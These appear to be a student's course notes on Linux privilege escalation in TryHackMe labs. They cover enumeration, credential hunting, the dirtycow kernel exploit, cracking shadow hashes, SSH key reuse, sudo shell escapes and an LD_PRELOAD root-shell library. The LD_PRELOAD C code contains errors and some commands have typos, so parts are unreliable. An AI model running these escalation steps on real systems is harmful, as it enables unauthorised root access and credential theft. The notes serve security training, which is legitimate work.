# Linux_Priviledge_Escalation
---

By Shivani Bhavsar

You got everything about Escalting Linux Privilege

---

[Overview](https://www.notion.so/Overview-7ea1c33b8a0f4952976eba1e6f0c3a43)

How to enumerate linux systems manually as well as with tools.

Privilege Escalation Techniques:

- Kernel Exploits
- Password Hunting
- File Permissions
- Sudo
    - Shell Escaping intended functionality, LD_PRELOAD
    - CVE-2019-14287
    - CVE-2019-18634
    
- SUID
    - Shared Object Injection
    - Binary Symlinks
    - Environment Variables
- CApabilities
- Scheduled Tasks
- NFS
- Docker

Hands-on-Practice:

- 11 vulnerable machine total
- Custom lab no installation
- Capstone challenge

[Lab overview setup](https://www.notion.so/Lab-overview-setup-d969d75c7ce348608166937f3fa09941)

Pre build lab is made on the try hack me. 

TryHackMe - [https://tryhackme.com/](https://tryhackme.com/) 

Linux PrivEsc Lab - [https://tryhackme.com/room/linuxprivescarena](https://tryhackme.com/room/linuxprivescarena) 

Try hack me VIP gets you faster machine in 10$/month. No need of the try hack me subscription for this course you can connect to openvpn with parrot or kali.

Connect lab with openvpn :

```bash
open file.ovpn
```

How to check tunnel is open?

```bash
ifconfig
```

Deploy the room of try hack me  [https://tryhackme.com/room/linuxprivescarena](https://tryhackme.com/room/linuxprivescarena)  then you can see the IP address.

Connect with ssh.

```bash
ssh TCM@10.10.40.34
ls
```

[Initial Enumeration](https://www.notion.so/Initial-Enumeration-81c3e296214d49d4a320149f037280b0)

# *System Enumeration*

Login to TCM using ssh.

```bash
TCM@debian:-$ ssh TCM@10.10.35.45
```

First three steps of hacking.

1. Information gathering
2. scanning and enumeration
3. Exploitation

**Learn how to do enumeration:**

```bash
TCM@debian:-$ hostname
TCM@debian:-$ whoami
TCM@debian:-$ uname -a
```

**uname -a** 

Provides the information about the system such as  Linux debian 2.6.32-5-amd64 

More similar information:

```bash
TCM@debian:-$ cat /proc/version
TCM@debian:-$ cat /etc/issue
```

Check the architecture:

```bash
TCM@debian:-$ lscpu
```

Check the services running:

```bash
TCM@debian:-$ ps aux
```

Which user running which task can be check by ps aux.

Check different task running by specific user:

```bash
TCM@debian:-$ ps aux | grep root
TCM@debian:-$  ps aux | grep TCM
```

# *User Enumeration*

What permission we have?

what we are capable of doing?

```bash
TCM@debian:-$ whoami
TCM@debian:-$ id
TCM@debian:-$ sudo -l
TCM@debian:-$ cat /etc/passwd
TCM@debian:-$ cat /etc/passwd | cut -d : -f 1
TCM@debian:-$ cat /etc/shadow
TCM@debian:-$ history
TCM@debian:-$ sudo su
```

**Sudo -l:** Show the file without password we can access

 **cut -d : -f 1:** Display only the users and the machine.

**sudo su**: Login as a root user to check whether you are able to access root

# *Network Enumeration*

What IP architecture it is?

What we are going to interact with?

What ports are open internally or externally?

```bash
TCM@debian:-$ ifconfig
TCM@debian:-$ ip a
TCM@debian:-$ ip route
TCM@debian:-$ ip neigh
TCM@debian:-$ arp -a
TCM@debian:-$ netstat -ano
```

**ip a:**  Displays the IP address, which network and broadcast.

**ip route:** Check if there was a route to another network.

**arp -a or ip neigh:** Display the arp table

**netstat -ano:** Which ports are open and which communication exist?

                 Which network do we have access?

                       Who’s out there in our network?

# *Password Hunting*

Password hunting on the sensistive files.

```bash
TCM@debian:-$ grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
TCM@debian:-$ grep --color=auto -rnw '/' -ie "PASS=" --color=always 2> /dev/null
```

This command search for the password and higlight with red color.

PASS= means aything start with the pass

Find the password files.

```bash
TCM@debian:-$ locate password | more
TCM@debian:-$ locate passwd | more
```

Hunt for the ssh Key.

```bash
TCM@debian:-$ find /-name authorized_key 2> /dev/null
TCM@debian:-$ find /-name id_rsa 2> /dev/null
```

[Exploring Automated Tools](https://www.notion.so/Exploring-Automated-Tools-a12e98e4a7ea4fb08379da35d45d666c)

# Exploring Automated Tools

# *Introduction*

Always important to run multiple tools.

**LinPeas** - [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 

**LinEnum** - [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum) 

**Linux Exploit Suggester** - [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) 

**Linux Priv Checker** - [https://github.com/sleventyeleven/linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)

```bash
TCM@debian:-$ ls
TCM@debian:-$ cd tools
TCM@debian:-$ cd linpeas
```

# ***Exploring Automated Tools***

```bash
TCM@debian:-$ cd linpeas
TCM@debian:-$ ls
TCM@debian:-$ ./linpeas.sh
```

 Stop an eye at Red/ Yellow to check

Highlight the linux version

Running th e hostname

Displays the user information

Process running

Network information

Active Ports

User Information

sensitive files

backup files

Resource: [https://github.com/carlospolop/PEASS-ng/tree/linpeas_dev](https://github.com/carlospolop/PEASS-ng/tree/linpeas_dev)


[Escalation Path: Kernel Exploits](https://www.notion.so/Escalation-Path-Kernel-Exploits-946236bec8734fa5a5d86bad7f6b9ec3)

# Kernel Exploit Overview

**what is a Kernel?**

The kernel is a computer program that controls everything in the system. Faciliates interactions between hardware and software components. Kernel is a translator.

**Kernel Exploits** - [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)

# Escalation via Kernel Exploit

```bash
TCM@debian:-$ uname -a

```

Search on google Linux debian 2.6.35-5-amd64 exploit. There will be bunch of different exploits

```bash
TCM@debian:-$ cd tools
TCM@debian:-$ ls
TCM@debian:-$ cd linux-exploit-suggester
TCM@debian:-$ ls
TCM@debian:-$ ./linux-exploit-suggester.sh

```

```bash
TCM@debian:-$ cd dirtycow
TCM@debian:-$ ls
```

Complie with gcc.

```bash
TCM@debian:-$ gcc -pthread c0w.c -o cow
TCM@debian:-$ ls
output: c0w.c cow
TCM@debian:-$ ./cow
output: Backing up  /usr/bin/passwd to /tmp/bak
TCM@debian:-$ passwd
```

Just by typing passwd you enter to root user.

```bash
TCM@debian:-$ id
TCM@debian:-$ whoami
```

[Escalation  Path: Password & File Permissions](https://www.notion.so/Escalation-Path-Password-File-Permissions-f396a9907a0b470987f940bf1f11522a)

# Overview

Look for weak file permission.

Look for ssh key

Learn how to absue those to gain escalation.

# Escalation via stored passwords

```bash
TCM@debian:-$ history
TCM@debian:-$ ls -la
TCM@debian:-$ su root
root@debian:-$ exit
```

**Resource:**

[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

[PayloadsAllTheThings/Linux - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

```bash
TCM@debian:-$ find . -type f -exec grep -i -I "PASSWORD: {} /dev/null \;
```

```bash
TCM@debian:-$ cd tools
TCM@debian:-$ cd linpeas
TCM@debian:-$ ls
TCM@debian:-$ ./linpeas.sh
```

Output: 

Find the pwd or passwd in the different files.

Looking for the possible password inside the files.

mysql -h somehost.local -uroot -ppassword123

```bash
TCM@debian:-$ ls
TCM@debian:-$ cat myvpn.ovpn
TCM@debian:-$ cat /etc/openvpn/auth.txt
TCM@debian:-$ history | grep pass
TCM@debian:-$ ps aux
```

# Escalation via Weak File Permission

```bash
TCM@debian:-$ ls -la /etc/passwd
TCM@debian:-$ ls -la /etc/shadow
TCM@debian:-$ cat /etc/passwd

```

Now copy the passwd file  and shadow and paste it in gedit passwd and shadow in you machine.

Open new terminal in your machine

```bash
root@kali:-# gedit passwd
root@kali:-# gedit shadow
root@kali:-# unshadow 
root@kali:-# unshadow passwd shadow
Output: root:$6....:0:0:root:/root:/bin/bash
```

So now you will be able to see root’s hash value instead of x in the passwd file

Copy root and TCM line in unshdow file

```bash
root@kali:-# gedit unshadow
```

Identify the different type of hash using hashcat.

Resouce: 

[hashcat - advanced password recovery](https://hashcat.net/hashcat/)

In windows terminal:

```bash
C:\users\Shivani\Desktop> hashcat64.exe -m 1800 creds.txt rockyou.txt -O
```

This will crack the hash can tells the password of the root user whic is password123.

# Escalation via SSH Keys

```bash
TCM@debian:-$ find / -name authorized_keys 2> /dev/null
TCM@debian:-$ find / -name id_rsa 2> /dev/null
TCM@debian:-$ ssh-keygen
```

sshkeygen : To generate the key public key and private key 

Authorized key: Authorize key is stored

Open new Terminal kali:

Copy the private key and paste it in id_rsa

```bash
root@kali:-# gedit id_rsa
root#kali:-# chmod 600 id_rsa
root@kali:-# ssh -i id_rsa root@10.10.35.45
```

Result: Login as a root without password. Here with the help of ssh key we are able to login as a root.

Now you are in the root user of debian:

```bash
root@debian:-# ls -la
root@debian:-# cd .ssh
root@debian:-# ls -la
root@debian:-# cat authorized_keys
```

[Escalation Path: Sudo](https://www.notion.so/Escalation-Path-Sudo-d71d46b20d5d49e282d06c30e0481df2)


# Escalation via Sudo shell Escaping

```bash
TCM@debian:-$ sudo -l
TCM@debian:-$ 
```

Resource: 

GTFOBins - [https://gtfobins.github.io/](https://gtfobins.github.io/)

[https://gtfobins.github.io/](https://gtfobins.github.io/)

Search vim and you will get different escalation.

Escalate vim

```bash
TCM@debian:-$ sudo vim -c ':!/bin/sh'
```

Now you will be successfully login 

```bash
sh-4.1# whoami

```

Another from sudo -l 

Escalate awk

```bash
TCM@debian:-$ sudo awk 'BEGIN {system("/bin/bash")}
```

Now we are in the root debian

```bash
root@debian:/home/user#
```

Resource:

Linux PrivEsc Playground - [https://tryhackme.com/room/privescplayground](https://tryhackme.com/room/privescplayground) 

 [Currently not available]

# Escalation via Intended Funtionality

Go to google search sudo apache2 privilege escalation

Resource: 

[https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/](https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/)

```bash
TCM@debian:-$ sudo apache2 -f /etc/shadow
```

Output: Display the root hash value

Resource:  wget example

[https://veteransec.org/hack-the-box-sunday-walkthrough/](https://veteransec.org/hack-the-box-sunday-walkthrough/)

# Escalation via  LD_PRELOAD

```bash
TCM@debian:-$ sudo -l
```

LD-PRELOAD : also known as preloading.

```bash
TCM@debian:-$ nano shell.c
```

```c
#include <stdio.h>
#include<syd/types.h>
#include<stdlib.h>

void_init() {
	unsetevn("LD_PRELOAD")
	setgid(0);
	setuid(0);
	system("/bin/bash");
}
```

Now complie it with the gcc.

```bash
TCM@debian:-$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles

```

Now preload

```bash
TCM@debian:-$ ls
TCM@debian:-$ sudo LD_PRELOAD=/home/user/shell.so apache2
```

# Challenge Walkthrough

# Escalation via CVE-2019-14287

# Escalation via CVE-2019-18634

[Escalation Path: SUID](https://www.notion.so/Escalation-Path-SUID-367a34f6fb504c5f87cc81a4a81e9f75)

[Escalation Path: Other SUID Escalation](https://www.notion.so/Escalation-Path-Other-SUID-Escalation-3499fe12053b4311a10829e18235c5f5)

[Escalation Path: Capabilities](https://www.notion.so/Escalation-Path-Capabilities-1d5f76d82b4e4f129ebaa6a6682a72e7)

[Escalation Path: Scheduled Tasks](https://www.notion.so/Escalation-Path-Scheduled-Tasks-e50e325782ce411e93226fc365cdfc0f)

[Escalation Path: NFS Root Squashing](https://www.notion.so/Escalation-Path-NFS-Root-Squashing-f307d8d8b80b491ab9011aebde96b4de)

[Escalation Path: Docker](https://www.notion.so/Escalation-Path-Docker-60cf38067b0d4cf9ab761975efd4f24a)

[Capstone Challenge](https://www.notion.so/Capstone-Challenge-5473fd2ee60a465f9a093ee8eac1e14f)
